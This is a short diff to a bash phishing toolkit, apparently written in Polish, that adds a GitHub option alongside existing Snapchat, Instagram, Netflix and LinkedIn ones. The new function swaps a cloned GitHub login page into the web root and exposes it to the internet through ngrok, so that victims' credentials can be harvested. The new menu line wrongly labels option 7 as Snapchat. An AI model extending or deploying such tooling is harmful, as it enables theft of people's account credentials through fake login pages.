@@ -54,6 +54,15 @@ snapchat_login_page()
 	sudo rm /var/www/html/index.html
 }
 
+github_login_page()
+{
+	echo "wybrales Github";
+	sudo rm /var/www/html/index.html
+	sudo cp github/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+
 exit_work()
 {
 	exit
@@ -72,6 +81,7 @@ echo -e "\e[31m  [3] Netflix\e[0m"
 echo -e "\e[31m  [4] Linkedin\e[0m"
 echo -e "\e[31m  [5] Instagram\e[0m"
 echo -e "\e[31m  [6] Snapchat\e[0m"
+echo -e "\e[31m  [7] Snapchat\e[0m"
 echo -e "\e[92m  [11] EXIT \e[0m"
 echo "================="
 
@@ -88,6 +98,7 @@ case "$opcja" in
   "4") linkedin_login_page ;;
   "5") instagram_login_page ;;
   "6") snapchat_login_page ;;
+  "7") github_login_page ;;
   "11") exit_work ;;
   *)  ./run.sh
   
